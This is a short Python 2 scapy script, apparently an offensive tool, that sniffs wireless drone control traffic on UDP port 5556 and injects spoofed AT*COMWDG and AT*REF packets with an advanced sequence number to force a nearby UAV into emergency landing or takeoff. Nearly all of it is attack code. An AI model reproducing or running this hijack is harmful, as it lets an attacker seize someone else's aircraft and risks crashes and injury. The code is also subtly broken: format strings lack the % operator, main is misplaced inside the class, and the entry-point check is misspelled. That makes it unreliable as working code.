import threading
import duplicate
from scapy.all import *

conf.iface = 'wlp7s0mon'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'

class interceptThread(threading.Thread):
	
	def __init__(self):
		threading.Thread.__init__(self)
		self.curPkt = None
		self.seq  = 0
		self.foundUAV = False

	def run(self):
		sniff(prn=self.interceptPkt,\
			filter='udp port 5556')

	def interceptPkt(self, pkt):
		if self.foundUAV == False:
			print '[*] UAV found '
			self.foundUAV = True

		self.curPkt = pkt
		raw =  pkt.sprintf('%Raw.load%')
		try:
			self.seq = int(raw.split('.')[0].split('=')[-1]+5)
		except:
			self.seq = 0

	def injectCMD(self, cmd):
		radio = duplicate.dupRadio(self.curPkt)
		dot11 = duplicate.dupDot11(self.curPkt)
		snap = duplicate.dupSNAP(self.curPkt)
		llc = duplicate.dupLLC(self.curPkt)
		ip = duplicate.dupIP(self.curPkt)
		udp = duplicate.dupUDP(self.curPkt)
		raw = Raw(load=cmd)
		injectPkt = radio / dot11 / llc / ip / udp / raw
		sendp(injectPkt)

	def emergencyLanding(self):
		spoofseq = self.seq+100
		watch = 'AT*COMWDG=%i\r' %spoofseq
		toCmd = 'AT*REF=%i.%s\r' (spoofseq+1, EMER)
		self.injectCMD(watch)
		self.injectCMD(toCmd)

	def takeOff(self):
		spoofseq = 	self.seq+100
		watch = 'AT*COMWDG=%i\r' %spoofseq
		toCmd = 'AT*REF=%i.%s\r' (spoofseq+1, TAKEOFF)
		self.injectCMD(watch)
		self.injectCMD(toCmd)

	def main():
		uavIntercept = interceptThread()
		uavIntercept.start()
		print '[*] Listening UAV traffic'
		while uavIntercept.foundUAV == False:
			pass
		while True:
			tmp = raw_input('[-]Press Enter for Emergency landing..')
			uavIntercept.emergencyLanding()

if __name__ == "__main":
	main()